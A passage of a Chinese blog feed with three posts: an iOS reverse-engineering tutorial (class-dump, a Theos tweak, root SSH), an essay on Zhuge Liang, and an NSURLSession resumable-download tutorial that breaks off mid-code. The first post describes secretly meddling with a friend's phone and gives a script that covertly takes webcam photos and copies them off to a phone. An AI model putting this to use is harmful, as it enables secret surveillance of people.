<p>接下来我们就会在目录下面找到我们所有的头文件了，经过对比之后，和源文件中的头文件是非常的相似的，除了一些参数类型被改成了id，类型名用arg1,arg2来表示之外，其他的基本都是一样的。通过这些头文件，那么闭源的App就会露出他们的马脚了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-11%20%E4%B8%8B%E5%8D%888.07.13.png" alt="屏幕快照 2017-12-11 下午8.07.13.png" title="" class="">
                <p>屏幕快照 2017-12-11 下午8.07.13.png</p>
            </figure>
<p>但是到这种程度还远远没有结束，因为现在App工程越来越庞大，而且引用了很多的第三方代码，所以我们使用class-dump的时候就会dump出成百上千个头文件，其实对于工程师的水平也是一种考验。之所以选择的是这个App是因为从App Store上下载的App都是经过加密的，直接使用class-dump就会失效，就像一个硬硬的核桃里面包着果肉，我们用镊子是不可能夹的出来的，首先干嘛？对了，锤子砸开它，在逆向工程中俗称砸壳，这个之后再介绍，下面说一下另一个工具。</p>
<h1 id="Theos"><a href="#Theos" class="headerlink" title="Theos"></a>Theos</h1><p>这是一个越狱开发工具包。它与其他的越狱开发工具相比，最大的特点就是简单:不管是下载安装还是Logos的语法还是编译发布都比较省事，既然比较起来就要提到另一个也就是整合在Xcode中的iOSOpenDev，作为一个经常使用Xcode的iOS工程师，本来我是打算使用这种工具的，但是逆向工程接触底层的知识比较多，很多东西无法自动化，工具太智能反而会坏了自己的根基，所以按照作者推荐选择了整合度不算太高的Theos。</p>
<p>工具安装的废话就不说了，但是一步一步的每个模块安装还是比较浪费时间的，所以我找到了一个在github上写了一个自动化配置脚本的友人，这里分享一个<a href="https://github.com/DaSens/Theos-Script" target="_blank" rel="external">链接</a>，同时也分享一个<a href="https://pan.baidu.com/s/1kTvex0r" target="_blank" rel="external">iOSOpenDev</a>的，来自一个具有开源精神的朋友。</p>
<p>等到配置完成之后就可以开始创建工程了，启动NIC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/theos/nic.pl</div></pre></td></tr></table></figure>
<p>然后根据选项我们创建一个Tweak工程，然后按照要求输入一系列的参数，也就算是我们的一个基础的Tweak工程创建完毕了，接下来还是结合实例来讲一下比较形象一点，我是在手机上修改了锁屏界面，也就是会进行弹窗，那么我们看看整个流程应该如何的去操作：</p>
<p>首先修改我们的MakeFile，这个文件中指定工程用到的所有文件、框架、库等，将整个过程自动化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">THEOS_DEVICE_IP = 192.168.199.129</div><div class="line">ARCHS = armv7 arm64</div><div class="line">TARGET = iphone:latest:7.0</div><div class="line"></div><div class="line">include /opt/theos/makefiles/common.mk</div><div class="line"></div><div class="line">TWEAK_NAME = ios_test</div><div class="line">ios_test_FILES = Tweak.xm</div><div class="line">ios_test_FRAMEWORKS = UIKit</div><div class="line"></div><div class="line">include $(THEOS_MAKE_PATH)/tweak.mk</div><div class="line"></div><div class="line">after-install::</div><div class="line">	install.exec &quot;killall -9 SpringBoard&quot;</div></pre></td></tr></table></figure>
<p>上面的语句其实并不难，简单的讲解一下就是说导入一些框架和文件，指定一下SDK的版本，适配处理器架构，最后在tweak安装之后杀掉SpringBoard进程，好让CydiaSubstate在进程启动时加载对应的dylib。</p>
<p>除此之外我们在第一行的时候制定了目标IP，也就是我们需要安装deb包的目标机的IP地址，这个手机中的网络旁边的圆圈感叹号中就可以看到，接下来要修改的就是我们的Tweak文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">%hook SpringBoard</div><div class="line"></div><div class="line">- (void)applicationDidFinishLaunching:(id)application&#123;</div><div class="line">  %orig;</div><div class="line">  UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@&quot;Are you ok?&quot; message:nil delegate:self cancelButtonTitle:@&quot;OK&quot; otherButtonTitles:nil];</div><div class="line">  [alert show];</div><div class="line">  [alert release];</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
<p>这个Tweak也只是一个demo，显然也非常的简单，意思也就是说勾住SpringBoard类中的<code>applicationDidFinishLaunching:</code>函数，然后执行其中我们重写的OC语句，也就是弹出一个框，这两部做完之后剩下的就是打包然后编译安装了，在这个地方我们最快捷的一条龙服务就只需要一个命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">make package install</div></pre></td></tr></table></figure>
<p>但是这期间会提示让你输入root密码，这显然是一种极其愚钝而又麻烦的做法，显然我们应该通过公钥免密登陆的方式才对，所以我们需要创建并且将之丢上去:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#首先在我们的Mac上，如果有就跳过，没有就创建</div><div class="line">ssh-keygen -t rsa</div><div class="line">#一路回车，然后将我们的公钥给cp出来</div><div class="line">cp ~/.ssh/id_rsa.pub ~/authorized_keys</div><div class="line">#接下来要在我们要安装的iphone上生成</div><div class="line">ssh-keygen</div><div class="line">#一路回车之后我们通过scp将公钥丢上去</div><div class="line">scp ~/authorized_keys root@Target_IP:/var/root/.ssh/authorized_keys</div></pre></td></tr></table></figure>
<p>这个时候我们就可以免密码登录了，但是我在这样操作的时候曾经出过一个问题，那就是我配置完之后依然需要root密码才能登录，那么这就很奇怪，所以我猜测是因为权限的问题，于是我修改了root目录以及authorized_keys的权限，发现依旧不行，于是我通过调试最后才发现是因为<code>/private/var/root</code>的目录权限不对导致公钥不会生效:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-11%20%E4%B8%8B%E5%8D%8811.11.21.png" alt="屏幕快照 2017-12-11 下午11.11.21.png" title="" class="">
                <p>屏幕快照 2017-12-11 下午11.11.21.png</p>
            </figure>
<p>我们可以看到其实在iphone中/etc和/var只不过是个符号链接，其实/private文件夹才是大权在握，最后经过修改之后才可以免密码登录，实现我们的一条龙服务，最后安装成功的效果是这样的：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/IMG_0056.PNG" alt="IMG_0056.PNG" title="" class="">
                <p>IMG_0056.PNG</p>
            </figure>
<h1 id="好玩的功能发掘"><a href="#好玩的功能发掘" class="headerlink" title="好玩的功能发掘"></a>好玩的功能发掘</h1><p>那么进入终端之后还可以做哪些好玩的事情呢，我今天尝试了一下，发现<code>open</code>这个命令其实非常的有意思，首先我们要安装<code>open</code>这个命令，然后通过<code>Erica Utilities</code>得到<code>plutil</code>，接下来我们就可以将手机交给别人玩了，接下来我们就悄悄的溜进终端，进行我们的秘密行动：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#首先我们可以通过命令查看当前的进程</div><div class="line">ps -A</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-11%20%E4%B8%8B%E5%8D%8811.38.13.png" alt="屏幕快照 2017-12-11 下午11.38.13.png" title="" class="">
                <p>屏幕快照 2017-12-11 下午11.38.13.png</p>
            </figure>
<p>原来在刷微博啊，那么我们首先来干扰一下他吧，我们来打开照相机，如果不知道ID的话首先就查看一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iPhone:/Applications root# cd Camera.app/</div><div class="line">iPhone:/Applications/Camera.app root# plutil Info.plist | grep CFBundleIdentifier</div><div class="line">    CFBundleIdentifier = &quot;com.apple.camera&quot;;</div></pre></td></tr></table></figure>
<p>知道了对应的ID之后的我们就可以通过open命令来打开它了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open com.apple.camera</div></pre></td></tr></table></figure>
<p>这个时候小伙伴已经不知所措，接下来我们要做一件更坏的事情，那就是杀掉他之前的微博进程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#杀掉对应的进程的PID</div><div class="line">kill 6957</div></pre></td></tr></table></figure>
<p>那么这个时候小伙伴应该是一头雾水，感觉还是挺好玩的，如果有进一步的操作技巧应该会更有意思。</p>
<p>在这之后觉得似乎还是不过瘾，决定发掘一些更有意思的功能，于是我就想到了通过手机来控制电脑进行拍照，也就是说我可以站在一个旁观者的角度去悄悄的记录一些东西，所以我就写了一个shell脚本:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">#! /bin/zsh</div><div class="line"></div><div class="line">function rand()&#123;</div><div class="line">  min=$1</div><div class="line">  max=$(($2-$min+1))</div><div class="line">  num=$(($RANDOM+1000000000))</div><div class="line">  echo $(($num%$max+$min))</div><div class="line">&#125;</div><div class="line"></div><div class="line">name=0</div><div class="line">name=$(rand 400000 500000)</div><div class="line">echo $name</div><div class="line">imagesnap -q -w 2 snaphoto$name.png</div><div class="line">scp ~/shellScript/snaphoto$name.png root@192.168.1.129:/var/mobile/Media/DCIM/100APPLE/</div><div class="line">ps -fe | grep scp | grep -v grep</div><div class="line">isDone=`echo $?`</div><div class="line">if [ &quot;$isDone&quot; -ne &quot;0&quot; ];</div><div class="line">then</div><div class="line">  echo yes</div><div class="line">  rm ~/shellScript/snaphoto$name.png</div><div class="line">fi</div></pre></td></tr></table></figure>
<p>这里就是通过调用facetime去进行拍照并且将照片即时上传到手机并且上传成功后删除本地照片，经过测试的结果发现整个过程大概只需要几秒：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-13%20%E4%B8%8B%E5%8D%8810.12.05.png" alt="屏幕快照 2017-12-13 下午10.12.05.png" title="" class="">
                <p>屏幕快照 2017-12-13 下午10.12.05.png</p>
            </figure>
<p>这个时候从我们的iphone上进行操作的话就只需要ssh连接到电脑上并执行这个脚本即可：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/IMG_0062.PNG" alt="IMG_0062.PNG" title="" class="">
                <p>IMG_0062.PNG</p>
            </figure>
<p>然后我们就可以通过iFile在相关目录下看到上传的照片了，但是由于每次照相的时候都会先开启一次FaceTime，这样其实不太好，所以还是要优化一下，另外一个问题就是在电脑锁屏的时候，拍摄出来的照片会不完整，整体亮度会特别低，导致看不清楚，会在之后的版本中优化，同时准备通过传感器来完成识别功能从而达到监测的效果，后期应该会选择云服务器作为资源存储:)</p>
]]></content>
      
        <categories>
            
            <category> 上手实战 OSX工具集 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[孔明的光环]]></title>
      <url>/2017/12/10/%E5%AD%94%E6%98%8E/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8A%E5%8D%8812.44.42.png" alt=""></p>
<p>在信息高速发展的年代，我们对于以前的历史人物认知似乎由剧本的价值导向和演员的演技的决定了，譬如前段时间的大军师司马懿，这种以个人为导向的观念毫无疑问会导致我们对真正的历史的认知产生偏差,凭着对与诸葛亮这个历史人物的喜爱，所以我决定对于他在历史上的一些光环一探究竟。</p>
<a id="more"></a>
<h1 id="0X00前言"><a href="#0X00前言" class="headerlink" title="0X00前言"></a>0X00前言</h1><p>说来有趣，对于历史重生兴趣的苗头竟是因为b站，其中的一些古风填词让我突然对诸葛丞相的一些生平起了些兴趣，小时候对于他的记忆仅仅停留在三国演义中那个似乎无所不能，从出山到西去都鲜有败绩的伟人，为后世君主百姓所推崇赞美，直到看到了诸葛亮和王朗关于大天下和小天下所展开的一场辩论—<a href="https://www.bilibili.com/video/av3037947/" target="_blank" rel="external">此物天下绝响</a>。</p>
<p>演艺中的故事多多少少会有些虚假的成分在其中，于是我根据几个点谈一谈我对丞相的看法，如果有不同的观点还请文明用语，饭后闲谈耳，不必太认真。</p>
<h2 id="0X01阵营的选择"><a href="#0X01阵营的选择" class="headerlink" title="0X01阵营的选择"></a>0X01阵营的选择</h2><p>东汉末年朝政极度腐败，阶级矛盾严重，农民被剥刻到极点，发起了大规模的起义，而统治阶级的内部斗争也非常激烈，直到汉灵帝驾崩，矛盾开始爆发，于是才有了后世所流传的三国演义。</p>
<p>整个三国时期我大致分为几个阶段—<code>黄巾之乱</code>、<code>诸侯伐董</code>、<code>群雄混战</code>、<code>三国鼎立</code>、<code>三家归晋</code>。在群雄混战时期，曹操自官渡之战之后已经奠定了北方霸主的威名，那么诸葛亮在当时为什么会选择还是寄人篱下的刘备而不是已经统一北方威震天下的曹操或者其他的霸主？这个问题千百年来都有人争论不休，我就暂且谈谈我的观点：</p>
<p>诸葛亮虽然在出师表中自称躬耕于南阳，本是布衣。但如果大家都真的认为他是个没什么背景的农民那就大错特错了。诸葛亮虽然隐居隆中，但他和荆州的上层人物关系密切，他的岳父黄承彦乃是刘表的连襟蔡瑁的妹夫。而刘表的原配夫人，也就是刘琦的生母过世后，刘表就迎娶了黄承彦老婆的妹妹。此外，诸葛亮的二姐嫁给了荆州名士庞德公的儿子，卧龙凤雏之名正是出自他口，而且诸葛瑾还在东吴做官，凭借和孙吴以及荆州名士的关系，加上他本身的才华，若是出仕必定早就会有一番作为，可他并没有，证明刘表和孙吴都不是他的志向所在。</p>
<p>他选择了当时几乎除了几乎一无所有的刘备，如果仅仅将这归结到个人魅力的原因上去，显然是不合适的，君择臣，臣亦择君。从诸葛亮在刘氏集团实施的治国理念可以看出诸葛亮所秉持的观念是和刘备最符合的。诸葛亮出山时北方基本已经大一统，曹操是典型的霸权主义者，曾经屠城徐州亦可见一斑，而且整个曹魏集团当时重用的是归顺的士族和有才华的平民，手下良将谋士如云，已成气候。孙权占据东吴，依靠三世基业，采取的是不对立方针，如此志向，和诸葛亮的匡扶汉室就算不是背道而驰，也不是良主。如果比较之下，治国理念和诸葛亮相合，又可以大权在握的人仅刘备耳。</p>
<h1 id="0X02君可自取？"><a href="#0X02君可自取？" class="headerlink" title="0X02君可自取？"></a>0X02君可自取？</h1><p>“三顾频烦天下计，两朝开济老臣心”，千百年来，”鞠躬尽瘁，死而后已”已成为丞相妇孺皆知的品质。在后三国时期，诸葛亮和司马懿同为托孤大臣，而司马懿却选择了篡位。曹操其实曾和曹丕说过司马懿此人有狼顾之相，不得不防。但是直到曹操死前，司马懿也没有露出他的狐狸尾巴，最后窃取到了三家胜利的果实。</p>
<p>还记得刘备托孤时曾对诸葛亮说出了”君可自取”这样的话，于是就有一种阴谋论说诸葛亮其实也有篡位之心，但是最起码要等到平定之后。从出师表中我们可以看到诸葛亮北伐中原的时候是正值益州疲弊，所以一定要打着兴复汉室，打着刘氏皇族的旗号，这样才是名正言顺，奉诰讨贼，这里的托孤的原文为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">章武三年春，先主于永安病笃，召亮于成都，属以后事，谓亮曰：“君才十倍于曹丕，必能安国，终定大师。若嗣子可辅，辅之；如若不才，君可自取。”亮涕曰：“臣敢竭股肱之力，效忠贞之节，继之以死!&quot;</div></pre></td></tr></table></figure>
<p>那么诸葛亮到底有没有这个心呢，在我看来应该是没有的，就算有的话也会在刘备托孤之后烟消云散，至少在看到大一统的曙光之前不可能再有。刘备临终前的那一句<code>君可自取</code>，是因为他知道诸葛亮不可能取，诸葛亮几十年君臣，同样知道刘备不可能给。话都说的得这么明白了，诸葛亮怎么敢，这就是刘备的软刀子杀人，况且刘备在死之前就已经通过联姻这种关系为刘禅打造了一个庞大的利益集团，如果诸葛亮要反，无疑就会涉及到利益重分配的问题，显然当时的蜀汉已经经不起这样的折腾了。更何况刘备还跟赵云交代过，如果军事方面也不稳定的话，简直就是给曹魏集团送人头了。</p>
<p>同时我们也可以了解到，当时托孤的场景是除了诸葛亮还有李严，如果说诸葛亮是荆州派系的利益集团代表，那么李严无疑就是代表着益州派系了。刘备此举未必没有互相节制之意。如果再稍微揣测一下，既然刘备知道诸葛亮不可能反，那么这句话其实也有可能是说过刘禅那一派的人听的，为的是为诸葛亮扫清之后做一个权臣的障碍。</p>
<p>所以综上所述这种论调应该是不成立的，特别是丞相在后三国时期为蜀汉鞠躬尽瘁，最后病死五丈原。那句<code>悠悠苍天，何薄于我</code>(原版是悠悠苍天，曷其有极)更是深深打动了我(虽然也有电视剧演绎的十分经典的原因)，也无怪后世对其有如此高的评价!</p>
<h1 id="0X03待补充"><a href="#0X03待补充" class="headerlink" title="0X03待补充"></a>0X03待补充</h1><p>因为知识的储备还没有达到可以继续侃大山的地步，所以还是先回去学习，免得说出一些无知话语贻笑大方，反而不美</p>
]]></content>
      
        <categories>
            
            <category> 三国 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS网络部分(一)]]></title>
      <url>/2017/12/08/iOS%E7%BD%91%E7%BB%9C%E9%83%A8%E5%88%86-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p>在学习逆向的过程中又延伸到了OC的runtime机制，也就是OC的灵魂所在，然后就莫名延伸到网络请求部分了，考虑到之前做项目原生写的网络请求+多线程也有些问题，所以还是总结一下吧</p>
<a id="more"></a>
<h2 id="NSURLConnection和NSURLSession"><a href="#NSURLConnection和NSURLSession" class="headerlink" title="NSURLConnection和NSURLSession"></a>NSURLConnection和NSURLSession</h2><h3 id="使用现状"><a href="#使用现状" class="headerlink" title="使用现状"></a>使用现状</h3><p>可以说NSURLSession是前者的替代了，早在13年的WWDC就和iOS7一起发布了，是对NSURLConnection进行了重构优化后新的网络访问接口。从iOS9.0开始，NSURLConnection中发送请求的两个方法就已经过期了，初始化网络连接的方法就是，就好比原来的UIAlertView和现在的UIActionController的关系差不多。</p>
<h3 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a>上传和下载</h3><p>NSURLSession针对上传和下载等复杂的网络操作提供了专门的解决方案，根据需求的不同分别对应了三种不同的网络请求任务。创建的task都是挂起状态，需要resume才能执行。</p>
<p>当服务器返回的数据比较小的时候，两者执行普通任务的操作步骤并没有什么区别，执行上传任务的以后，如果是post都需要设置请求体。在这里还体现不出来为什么Apple会放弃前者，那么我们再来看看下载的部分好了：</p>
<p>前者在下载文件的时候，首先会将整个文件下载到内存中去，然后再写入沙盒，那么这就意味着如果一个文件再过大的时候就会出现内存暴涨的情况，而后者会默认下载到沙盒路径下的tmp文件夹，下载完成之后再将临时文件删除，如果还需要保存的话可以在回调方法中写明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">NSURLSessionDownloadTask *task = [session downloadTaskWithURL:[NSURL URLWithString:@&quot;http://127.0.0.1/dawenjian.zip&quot;] completionHandler:^(NSURL * _Nullable location, NSURLResponse * _Nullable response, NSError * _Nullable error) &#123;</div><div class="line">   //获取沙盒的caches路径</div><div class="line">   NSString *path = [[NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@&quot;kkk.dmg&quot;];</div><div class="line"></div><div class="line">   //生成URL路径</div><div class="line">   NSURL *DCurl = [NSURL fileURLWithPath:path];</div><div class="line"></div><div class="line">   //将文件保存到指定文件目录下</div><div class="line">   [[NSFileManager defaultManager]moveItemAtURL:location toURL:DCurl error:nil];   &#125;];</div><div class="line">[task resume];</div></pre></td></tr></table></figure>
<p>还有一点就是后者在请求方式上要更加灵活一些，因为前者从实例化开始就会发送请求，可以cancel掉，但是后者还拥有着暂停和恢复方法，相较更加优化。</p>
<h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><p>NSURLConnection进行断点下载，通过设置访问请求的HTTPHeaderField的Range属性，开启运行循环，NSURLConnection的代理方法作为运行循环的事件源，接收到下载数据时代理方法就会持续调用，并使用NSOutputStream管道流进行数据保存。</p>
<p>NSURLSession进行断点下载，当暂停下载任务后，如果 downloadTask （下载任务）为非空，调用 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cancelByProducingResumeData:(void (^)(NSData *resumeData))completionHandler</div></pre></td></tr></table></figure>
<p> 这个方法，这个方法接收一个参数，完成处理代码块，这个代码块有一个 NSData 参数 resumeData，如果 resumeData 非空，我们就保存这个对象到视图控制器的 resumeData 属性中。在点击再次下载时，通过调用 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[self.session downloadTaskWithResumeData:self.resumeData]resume]</div></pre></td></tr></table></figure>
<p>方法进行继续下载操作。 经过以上比较可以发现，使用NSURLSession进行断点下载更加便捷。</p>
<h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><p>NSURLSession的构造方法 （sessionWithConfiguration:delegate:delegateQueue）中有一个 NSURLSessionConfiguration类的参数可以设置配置信息，其决定了cookie，安全和高速缓存策略，最大主机连接数，资源管理，网络超时等配置。NSURLConnection不能进行这个配置，相比于 NSURLConnection 依赖于一个全局的配置对象，缺乏灵活性而言，NSURLSession 有很大的改进了。NSURLSession可以设置三种配置信息，分别通过调用三个类方法返回配置对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+ (NSURLSessionConfiguration *)defaultSessionConfiguration</div><div class="line">  //配置信息使用基于硬盘的持久化Cache，保存用户的证书到钥匙串,使用共享cookie存储；</div><div class="line">+ (NSURLSessionConfiguration *)ephemeralSessionConfiguration </div><div class="line">  //配置信息和default大致相同。除了，不会把cache，证书，或者任何和Session相关的数据存储到硬盘，而是存储在内存中，生命周期和Session一致。比如浏览器无痕浏览等功能就可以基于这个来做；</div><div class="line"> + (NSURLSessionConfiguration *)backgroundSessionConfigurationWithIdentifier:(NSString *)identifier</div><div class="line">  //配置信息可以创建一个可以在后台甚至APP已经关闭的时候仍然在传输数据的session。注意，后台Session一定要在创建的时候赋予一个唯一的identifier，这样在APP下次运行的时候，能够根据identifier来进行相关的区分。如果用户关闭了APP,IOS 系统会关闭所有的background Session。而且，被用户强制关闭了以后，IOS系统不会主动唤醒APP，只有用户下次启动了APP，数据传输才会继续。</div></pre></td></tr></table></figure></p>
<p>当然虽然NSURLSession已经比较优化了，但是要灵活的使用其代理方法才能将其性能给发挥出来，比如说SDWebImage中的下载方法中有一个回调可以打印下载的进度调用的就是<code>NSURLSessionDownloadDelegate</code>的代理方法。如果阅读一下这种框架的源码对于我们程序能力的提升也是比较大的。同时原生的做文件的上传下载的时候推荐使用配置信息，最好是写在session的懒加载之中。</p>
<p>·</p>
<h2 id="对于断点续传的处理"><a href="#对于断点续传的处理" class="headerlink" title="对于断点续传的处理"></a>对于断点续传的处理</h2><p>这种功能在业务中其实是很常见的，很多时候我们需要暂停，过一段时间再继续下载，或者由于某种情况断了网，希望恢复之后可以紧接着原来的进度，如果下游戏的时候不小心关机了，如果没有这样的处理，估计玩家们都会急得跳脚了。那么回归正题，主要的模块就是下面几个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">- (IBAction)startBtnClick:(id)sender&#123;</div><div class="line">  NSURL *url = [NSURL URLWithString:@&quot;http://127.0.0.1/resources/1.zip&quot;];</div><div class="line">  //创建请求对象</div><div class="line">  NSURLRequest *request = [NSURLRequest requestWithURL:url];</div><div class="line">  //创建session</div><div class="line">  self.session = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration] delegate:self delegateQueue:[NSOperationQueue mainQueue]];</div><div class="line">  //创建Task</div><div class="line">  NSURLSessionDownloadTask *downloadTask = [self.session downloadTaskWithRequest:request];</div><div class="line">  self.downloadTask = downloadTask;</div><div class="line">  //执行Task</div><div class="line">  [self.downloadTask resume];</div><div class="line">&#125;</div><div class="line"></div><div class="line">//暂停部分</div><div class="line">- (IBAction)suspendBtnClick:(id)sender&#123;</div><div class="line">  [self.downloadTask suspend];</div><div class="line">&#125;</div><div class="line"></div><div class="line">//取消部分</div><div class="line">- (IBAction)cancelBtnClick:(id)sender&#123;</div><div class="line">  [self.downloadTask cancel];</div><div class="line">&#125;</div><div class="line"></div><div class="line">//继续下载部分</div><div class="line">- (IBAction)goOnBtnClick:(id)sender&#123;</div><div class="line">  [self.downloadTask resume];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看起来应该是很简单的，但这只是一个最简陋版而已，下面就有一点注意了，那就是在cancel之后任务是无法恢复的，如果想要取消之后恢复的话就要获得之前的下载数据并重新开启一个下载的任务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//恢复下载的数据不等于文件数据，而是类似于元数据，只是记录位置、时间</div><div class="line">[self.downloadTask cancelByProducingResumeData:^(NSData * _Nullable resumeData)&#123;</div><div class="line">  self.resumeData = resumeData;</div><div class="line">&#125;];</div><div class="line"></div><div class="line">//于此同时继续下载方法也需要迭代</div><div class="line">- (IBAction)goOnBtnClick:(id)sender&#123;</div><div class="line">  if(self.resumeData)&#123;</div><div class="line">    self.downloadTask = [self.session downloadTaskWithResumeData:self.resumeData];</div><div class="line">  &#125;</div><div class="line">  [self.downloadTask resume];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>那么经过这一次的迭代之后我们就可以避免用户误点而造成的流量损耗，接下来想想还有什么可以去优化的地方，如果用户不小心退出了呢？那么点开始下载岂不是又会重新下载，虽然现在的iOS多任务后台已经完善了很多，但这个时候我们依旧不可能再通过控制器中的属性再做判断了，显然要利用一个不会随着控制器生命周期结束的东西作为我们的判断标准，没错，那就是沙盒缓存，这里我们需要用到文件句柄:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">//首先要在得到response的代理方法中创建文件句柄和空文件</div><div class="line">- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveResponse:(NSURLResponse *)response completionHandler:(void (^)(NSURLSessionResponseDisposition))completionHandler&#123;</div><div class="line"> 	self.totalSize = response.expectedContentLength; </div><div class="line"></div><div class="line">	self.fullPath = [[NSSearchPathForDirectoryInDomains(NSCachesDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:response.suggestedFilename];</div><div class="line"></div><div class="line">	//创建空文件</div><div class="line">	[[NSFileManager defaultManager] createFileAtPath:fullPath contents:nil 		attributes:nil];</div><div class="line"></div><div class="line">	//创建文件句柄，其实句柄的英文名就是File handle，也就是控制file的东西，只不过翻译后会让人不明所以</div><div class="line">	self.handle = [NSFileHandle fileHandleForWritingAtPath:fullPath];</div><div class="line">	completionHandler(NSURLSessionResponseAllow);  </div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line">//得知下载的过程,根据进度条直观的显示</div><div class="line">- 